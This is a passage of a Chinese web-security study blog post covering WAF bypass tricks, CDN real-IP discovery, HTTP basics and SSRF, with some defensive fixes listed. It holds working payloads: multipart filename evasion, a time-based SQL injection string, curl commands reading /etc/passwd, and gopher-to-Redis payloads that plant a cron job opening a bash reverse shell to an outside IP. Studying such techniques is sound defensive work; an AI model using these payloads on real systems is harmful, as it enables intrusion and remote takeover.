<h5 id="1-2-利用同网段"><a href="#1-2-利用同网段" class="headerlink" title="1.2 利用同网段"></a>1.2 利用同网段</h5><p>一些在云服务商的站点，同时使用云服务商提供的WAF服务。当流量不是通过DNS解析引流到WAF，流量必须经过WAF的检测，这是不能通过发行源站进行绕过。可以考虑在云服务商买一台VPS，通过VPS攻击目标站点，因为流量是局域网，可能不经过WAF检测，实现绕过。能不能成功，关键在于云服务商的网络配置。</p>
<h5 id="1-3-利用边界漏洞"><a href="#1-3-利用边界漏洞" class="headerlink" title="1.3 利用边界漏洞"></a>1.3 利用边界漏洞</h5><p>如果未能发现源站IP，可以尝试寻找子站的SSRF漏洞。如果子站访问目标站不经过WAF集群，可以利用SSRF漏洞来绕过WAF。</p>
<h4 id="2-资源限制角度绕过WAF"><a href="#2-资源限制角度绕过WAF" class="headerlink" title="2.资源限制角度绕过WAF"></a>2.资源限制角度绕过WAF</h4><p>这是众所周知、而又难以解决的问题。如果HTTP请求POST BODY太大，检测所有的内容，WAF集群消耗太大的CPU、内存资源。<strong>因此许多WAF只检测前面的几K字节、1M、或2M</strong>。对于攻击者而然，只需要在<strong>POST BODY前面添加许多无用数据</strong>，把攻击payload放在最后即可绕过WAF检测。</p>
<h5 id="3-协议层绕过WAF"><a href="#3-协议层绕过WAF" class="headerlink" title="3. 协议层绕过WAF"></a>3. 协议层绕过WAF</h5><p>即使流量都确保经过WAF，协议层面绕过WAF，利用WAF解析协议的问题，使得payload被认为不是请求的HTTP请求的内容。从个人经验总结出WAF解析协议的常出现问题的三个方向。</p>
<ul>
<li>协议覆盖不全。</li>
<li>协议解析不正确。</li>
<li>协议解析与后WEB容器的协议解析不一致。</li>
</ul>
<p>以下以实例说明利用协议绕过WAF的方法。通过CASE解析什么是协议覆盖不全、协议解析不正确、协议解析不一致。</p>
<h5 id="3-1-协议未覆盖绕过WAF"><a href="#3-1-协议未覆盖绕过WAF" class="headerlink" title="3.1 协议未覆盖绕过WAF"></a>3.1 协议未覆盖绕过WAF</h5><p>POST 请求常用有2种参数提交方式：</p>
<ul>
<li>​    Content-Type: application/x-www-form-urlencoded;</li>
<li>​    Content-Type: multipart/form-data;</li>
</ul>
<p>Waf未能覆盖Content-Type: multipart/form-data从而导致被绕过。或者WAF会认为它是文件上传请求，从而只检测文件上传，导致被绕过。如图，加速乐的WAF就存在被绕过的情况，是典型的协议未覆盖。</p>
<p><img src="3.png" alt=""></p>
<h5 id="3-2-利用协议解析不一致绕过"><a href="#3-2-利用协议解析不一致绕过" class="headerlink" title="3.2 利用协议解析不一致绕过"></a>3.2 利用协议解析不一致绕过</h5><p><a href="https://weibo.com/ttarticle/p/show?id=2309404002575157473609" target="_blank" rel="noopener">参考</a></p>
<p><img src="4.png" alt=""></p>
<h5 id="3-3-协议解析不正确"><a href="#3-3-协议解析不正确" class="headerlink" title="3.3 协议解析不正确"></a>3.3 协议解析不正确</h5><ul>
<li><p><strong>文件名被覆盖一</strong>：在multipart协议中，一个文件上传块存在多个Content-Disposition，将以最后一个Content-Disposition的filename值作为上传的文件名，许多WAF解析到第一个Content-Disposition就认为协议解析完毕，获得上传的文件名，从而导致被绕过。</p>
</li>
<li><p><strong>文件名被覆盖二</strong>：在一个Content-Disposition 中，存在多个filename ，协议解析应该使用最后的filename值作为文件名。如果WAF解析到filename=”p3.txt”认为解析到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是t3.jsp。</p>
<p>Content-Disposition: form-data;name=”myfile”; filename=”p3.txt”;filename=”t3.jsp”</p>
</li>
<li><p><strong>未解析所有文件</strong>：multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。</p>
<p><img src="5.png" alt="image-20190828161247055"></p>
</li>
<li><p><strong>协议解析不一致</strong>-文件名解析兼容性：multipart协议中，文件名的形式为filename=”abc.php”。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 filename=”abc.php、filename=abc.php”、 ”filename=’abc.php’。而<strong>WAF只按照协议标准去解析，无法解析文件名</strong>，但是<strong>后端容器能正确获得文件名，从而导致被绕过</strong>。场景的绕过形式：</p>
<ul>
<li>Content-Disposition: form-data; name=”file”; filename=abc.php</li>
<li>Content-Disposition: form-data; name=”file”; filename=”abc.php</li>
<li>Content-Disposition: form-data; name=”file”; filename=’abc.php’</li>
</ul>
</li>
<li><p>使用注释扰乱分块数据包</p>
<p>WAF无法识别注释符，分块传输可以在长度标识处加上分号“;”作为注释，几乎所有可以识别Transfer-Encoding数据包的WAF，都没有<strong>处理分块数据包中长度标识处的注释</strong>，导致在分块数据包中加入注释的话，WAF就识别不出这个数据包了。</p>
</li>
</ul>
<h4 id="4-规则缺陷绕过WAF"><a href="#4-规则缺陷绕过WAF" class="headerlink" title="4. 规则缺陷绕过WAF"></a>4. 规则缺陷绕过WAF</h4><p>请求中包含2个参数名相同的参数typeid，第一个是正常参数的值正常，第二个参数才是payload。如果WAF解析参数使用第一个值，没检查第二个值，将导致绕过。这是很久很久的一个CASE，现在几乎没有WAF存在这个问题。</p>
<p><code>/forum.php？ typeid=644&amp;typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/*’XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR’%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22*/</code></p>
<h3 id="0x06-CDN"><a href="#0x06-CDN" class="headerlink" title="0x06 CDN"></a>0x06 CDN</h3><h4 id="1-发现CDN"><a href="#1-发现CDN" class="headerlink" title="1. 发现CDN"></a>1. 发现CDN</h4><ol>
<li><p>nslookup 多个ip地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nslookup baidu.com</span><br><span class="line">Server:		192.168.1.1</span><br><span class="line">Address:	192.168.1.1#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: 39.156.69.79</span><br></pre></td></tr></table></figure>
</li>
<li><p>多地ping</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@iZt4nip7c3ds4qlsa0x6zjZ ~]# ping www.baidu.com</span><br><span class="line">PING www.wshifen.com (45.113.192.102) 56(84) bytes of data.</span><br><span class="line">64 bytes from 45.113.192.102 (45.113.192.102): icmp_seq=1 ttl=58 time=0.688 ms</span><br><span class="line">64 bytes from 45.113.192.102 (45.113.192.102): icmp_seq=2 ttl=58 time=0.698 ms</span><br><span class="line"></span><br><span class="line">➜  ~ ping www.baidu.com</span><br><span class="line">PING www.a.shifen.com (61.135.169.121): 56 data bytes</span><br><span class="line">64 bytes from 61.135.169.121: icmp_seq=0 ttl=56 time=5.117 ms</span><br><span class="line">64 bytes from 61.135.169.121: icmp_seq=1 ttl=56 time=10.500 ms</span><br><span class="line">64 bytes from 61.135.169.121: icmp_seq=2 ttl=56 time=3.424 ms</span><br></pre></td></tr></table></figure>
<p>在线：<a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com</a></p>
</li>
</ol>
<h5 id="2-查找真实ip"><a href="#2-查找真实ip" class="headerlink" title="2. 查找真实ip"></a>2. 查找真实ip</h5><p>有效方法：</p>
<ol>
<li><p>让你的目标站主动“联系”你，比如你订阅他们的网站，RSS之类的，或者让目标站给你发邮件，比如验证注册邮件之类的，但是如果目标站使用的是别的邮箱接口就GG，不过买得起CDN加速了一般也是自己搭建的公司邮件服务器，如果他们的邮件服服务跟WEB服务在一个服务器上，这时候只要查看邮件服务器的IP就好了（查看发的邮件的源代码就可以看到了好像），但是很可能邮件服务器IP跟web服务器只是在一个c段上，这时候就进行C段扫描吧，然后找开放80端口的ip进行一个一个验证（C段扫描就可以用msscan或者提供在线C段扫描的网站），当不是在一个C段时，可能会有点绝望了吧</p>
</li>
<li><p>利用fofa这个网络空间搜索引擎。首先F12查看目标网站的源代码，找到站点的title，然后结合fofa提供的语法（title=”title”）进行查找，很多网站的title最后会有自己站点的域名，这时候可能就能利用fofa找到真实的IP了（fofa的搜索结果可以看到站点的IP）。说一句，我在这次之战中没有成功，找到的IP去过去是另一个站点2333   ps： titile=”” &amp;&amp; port=80 查询了一下360 根据fofa应该是36.110.213.49</p>
</li>
<li><p>子域名入手</p>
</li>
<li><p>网站漏洞</p>
<ul>
<li>敏感信息泄漏：phpinfo敏感信息泄露、Apache status和Jboss status敏感信息泄露、网页源代码泄露、svn信息泄露信、github信息泄露等。</li>
<li>web漏洞：使服务器主动与我们建立联系：ssrf、xss、命令执行</li>
</ul>
<p><img src="6.png" alt="img"></p>
</li>
<li><p>历史域名绑定</p>
<p>查询IP和历史域名绑定记录，有在线的查询网站</p>
</li>
<li><p>网络空间引擎搜索法：fofa、zoomEye</p>
</li>
</ol>
<blockquote>
<p>特有的http头部（如server类型、版本、cookie等信息)、<br>特定keyword（如title、css、js、url等）、<br>特定的IP段搜索（如fofa支持C段搜索），<br>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。</p>
</blockquote>
<h3 id="0x07-网络协议"><a href="#0x07-网络协议" class="headerlink" title="0x07 网络协议"></a>0x07 网络协议</h3><h4 id="1-http协议"><a href="#1-http协议" class="headerlink" title="1. http协议"></a>1. http协议</h4><h5 id="请求报文"><a href="#请求报文" class="headerlink" title="请求报文"></a>请求报文</h5><p>HTTP 协议是以 ASCII 码传输，建立在 TCP/IP 协议之上的应用层规范。规范把 HTTP 请求分为三个部分：状态行、请求头、消息主体。类似于下面这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;method&gt; &lt;request-URL&gt; &lt;version&gt;</span><br><span class="line">&lt;headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;entity-body&gt;</span><br></pre></td></tr></table></figure>
<p>post content-type/encrypt 获知消息主体是如何编码的:</p>
<ul>
<li>application/x-www-form-urlencoded 原生form表单</li>
<li><p>multipart/form-data 上传文件</p>
</li>
<li><p>application/json、 text/html、text/plain、application/x-protobuf</p>
</li>
</ul>
<h5 id="响应报文"><a href="#响应报文" class="headerlink" title="响应报文"></a>响应报文</h5><p>常见的状态码有如下几种：</p>
<ul>
<li><code>200 OK</code> 客户端请求成功</li>
<li><code>301 Moved Permanently</code> 请求永久重定向</li>
<li><code>302 Moved Temporarily</code> 请求临时重定向</li>
<li><code>304 Not Modified</code> 文件未修改，可以直接使用缓存的文件。</li>
<li><code>400 Bad Request</code> 由于客户端请求有语法错误，不能被服务器所理解。</li>
<li><code>401 Unauthorized</code> 请求未经授权。这个状态代码必须和WWW-Authenticate报头域一起使用</li>
<li><code>403 Forbidden</code> 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因</li>
<li><code>404 Not Found</code> 请求的资源不存在，例如，输入了错误的URL</li>
<li><code>500 Internal Server Error</code> 服务器发生不可预期的错误，导致无法完成客户端的请求。</li>
<li><code>503 Service Unavailable</code> 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。</li>
</ul>
<h4 id="2-https协议"><a href="#2-https协议" class="headerlink" title="2. https协议"></a>2. https协议</h4><p>两个过程</p>
<ol>
<li>非对称加密传输保证对称密钥的安全传输</li>
<li>对称加密保证数据内容的安全传输</li>
</ol>
<p>关键在于如何保证对称密钥的安全传输的？</p>
<p>CA证书保证服务器端公钥的安全传输 （CA证书由权威机构颁发，可以信任）</p>
<p><img src="7.png" alt="img"></p>
<h3 id="0x08-SSRF"><a href="#0x08-SSRF" class="headerlink" title="0x08 SSRF"></a>0x08 SSRF</h3><p>本质：服务器提供了从其他服务器获取数据的功能但没有对目标地址做过滤</p>
<p>云环境：支持远程代码部署、远程图片请求、数据同步、博客迁移、ffpmg</p>
<p>场景：（调取第三方服务）翻译、图片/文章收藏、图片加载/下载、编码处理、文件处理如ffpmg，ImageMagick，docx，pdf，xml、网站采集（针对输入的网站进行信息收集）</p>
<p>协议：http、file、dict、gopher、ftp</p>
<p>在自己vps上监听端口 查看来源的user-agent：与编程语言结合</p>
<p>大部分选用gopher，比较容易进入黑名单 所以可以先用dict去简单测试</p>
<p>各种协议利用姿势：工具–curl</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地利用</span></span><br><span class="line"><span class="comment"># dict protocol (操作Redis)</span></span><br><span class="line">curl -vvv <span class="string">'dict://127.0.0.1:6379/info'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol (任意文件读取)</span></span><br><span class="line">curl -vvv <span class="string">'file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol (一键反弹Bash)</span></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line">curl -vvv <span class="string">'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程利用</span></span><br><span class="line"><span class="comment"># 利用file协议任意文件读取</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用dict协议查看端口</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用gopher协议反弹shell</span></span><br><span class="line">curl -v <span class="string">'http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure>
<p>绕过技巧：IP地址进制绕过、url特殊字符绕过如@、<code>&lt;http://xxx.192.168.0.1.xip.io/&gt; == 192.168.0.1</code>、</p>
<p>漏洞修复：</p>
<ol>
<li><p>禁止跳转</p>
</li>
<li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
</li>
<li><p>禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题</p>
</li>
<li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p>
</li>
<li><p>限制请求的端口为http常用的端口，比如 80、443、8080、8090</p>
</li>
<li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
</li>
</ol>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="m3lon WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/03/15/Apache httpOnly cookie disclosure引发的Cookie思考/" rel="next" title="Apache httpOnly cookie disclosure引发的Cookie思考">
                <i class="fa fa-chevron-left"></i> Apache httpOnly cookie disclosure引发的Cookie思考
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/03/16/Web安全面试准备一/" rel="prev" title="Web安全面试准备一">
                Web安全面试准备一 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMzYxOC8xMDE3Mw=="></div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/UMR.png" alt="m3lon">
            
              <p class="site-author-name" itemprop="name">m3lon</p>
              <p class="site-description motion-element" itemprop="description">萌新一枚</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/CTF/index.html">
                  <span class="site-state-item-count">6</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://lambdax.me/" title="Lambdax" target="_blank">Lambdax</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.51cto.com/skytina" title="skytina" target="_blank">skytina</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.cnblogs.com/iamstudy" title="l3m0n" target="_blank">l3m0n</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://stone.moe/" title="StoneMoe" target="_blank">StoneMoe</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-API接口测试"><span class="nav-number">1.</span> <span class="nav-text">0x01 API接口测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-接口定义"><span class="nav-number">1.1.</span> <span class="nav-text">1. 接口定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-接口类型"><span class="nav-number">1.2.</span> <span class="nav-text">2. 接口类型</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-RPC"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 RPC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-2-RESTful-API"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 RESTful API</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-3-Web-Service"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 Web Service</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-接口鉴权"><span class="nav-number">1.3.</span> <span class="nav-text">3. 接口鉴权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-HTTP-Basic"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 HTTP Basic</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-Digest-Access"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 Digest Access</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-3-App-Secret-Key-HMAC"><span class="nav-number">1.3.3.</span> <span class="nav-text">3.3 App Secret Key + HMAC</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-4-JWT（Json-Web-Tokens）"><span class="nav-number">1.3.4.</span> <span class="nav-text">3.4 JWT（Json Web Tokens）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-5-OAuth1-0"><span class="nav-number">1.3.5.</span> <span class="nav-text">3.5 OAuth1.0</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-6-OAuth2-0"><span class="nav-number">1.3.6.</span> <span class="nav-text">3.6 OAuth2.0</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-7-参考"><span class="nav-number">1.3.7.</span> <span class="nav-text">3.7 参考</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-安全测试"><span class="nav-number">1.4.</span> <span class="nav-text">4. 安全测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4-1-输入控制"><span class="nav-number">1.4.1.</span> <span class="nav-text">4.1 输入控制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-2-逻辑越权"><span class="nav-number">1.4.2.</span> <span class="nav-text">4.2 逻辑越权</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-3-接口滥用"><span class="nav-number">1.4.3.</span> <span class="nav-text">4.3 接口滥用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-4-信息泄漏"><span class="nav-number">1.4.4.</span> <span class="nav-text">4.4 信息泄漏</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-安全加固"><span class="nav-number">1.5.</span> <span class="nav-text">5. 安全加固</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#5-1-访问"><span class="nav-number">1.5.1.</span> <span class="nav-text">5.1 访问</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-2-输入"><span class="nav-number">1.5.2.</span> <span class="nav-text">5.2 输入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-3-处理"><span class="nav-number">1.5.3.</span> <span class="nav-text">5.3 处理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-4-输出"><span class="nav-number">1.5.4.</span> <span class="nav-text">5.4 输出</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Python"><span class="nav-number">2.</span> <span class="nav-text">0x02 Python</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Python的执行顺序"><span class="nav-number">2.1.</span> <span class="nav-text">1 Python的执行顺序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-生成器、迭代器-👇这里"><span class="nav-number">2.2.</span> <span class="nav-text">2 生成器、迭代器 👇这里</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-进程、线程、协程"><span class="nav-number">2.3.</span> <span class="nav-text">3 进程、线程、协程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-未授权漏洞"><span class="nav-number">3.</span> <span class="nav-text">0x03 未授权漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-redis未授权"><span class="nav-number">3.1.</span> <span class="nav-text">1. redis未授权</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-1-crontab写计划任务反弹shell"><span class="nav-number">3.1.1.</span> <span class="nav-text">1.1 crontab写计划任务反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-写ssh公钥远程连接"><span class="nav-number">3.1.2.</span> <span class="nav-text">1.2 写ssh公钥远程连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-3-写入webshell"><span class="nav-number">3.1.3.</span> <span class="nav-text">1.3 写入webshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-4-漏洞加固"><span class="nav-number">3.1.4.</span> <span class="nav-text">1.4 漏洞加固</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-业务逻辑漏洞"><span class="nav-number">4.</span> <span class="nav-text">0x04 业务逻辑漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-WAF绕过"><span class="nav-number">5.</span> <span class="nav-text">0x05 WAF绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-架构层绕过WAF"><span class="nav-number">5.1.</span> <span class="nav-text">1. 架构层绕过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-1-寻找源站"><span class="nav-number">5.1.1.</span> <span class="nav-text">1.1 寻找源站</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-利用同网段"><span class="nav-number">5.1.2.</span> <span class="nav-text">1.2 利用同网段</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-3-利用边界漏洞"><span class="nav-number">5.1.3.</span> <span class="nav-text">1.3 利用边界漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-资源限制角度绕过WAF"><span class="nav-number">5.2.</span> <span class="nav-text">2.资源限制角度绕过WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-协议层绕过WAF"><span class="nav-number">5.2.1.</span> <span class="nav-text">3. 协议层绕过WAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-协议未覆盖绕过WAF"><span class="nav-number">5.2.2.</span> <span class="nav-text">3.1 协议未覆盖绕过WAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-利用协议解析不一致绕过"><span class="nav-number">5.2.3.</span> <span class="nav-text">3.2 利用协议解析不一致绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-3-协议解析不正确"><span class="nav-number">5.2.4.</span> <span class="nav-text">3.3 协议解析不正确</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-规则缺陷绕过WAF"><span class="nav-number">5.3.</span> <span class="nav-text">4. 规则缺陷绕过WAF</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-CDN"><span class="nav-number">6.</span> <span class="nav-text">0x06 CDN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-发现CDN"><span class="nav-number">6.1.</span> <span class="nav-text">1. 发现CDN</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-查找真实ip"><span class="nav-number">6.1.1.</span> <span class="nav-text">2. 查找真实ip</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-网络协议"><span class="nav-number">7.</span> <span class="nav-text">0x07 网络协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-http协议"><span class="nav-number">7.1.</span> <span class="nav-text">1. http协议</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#请求报文"><span class="nav-number">7.1.1.</span> <span class="nav-text">请求报文</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 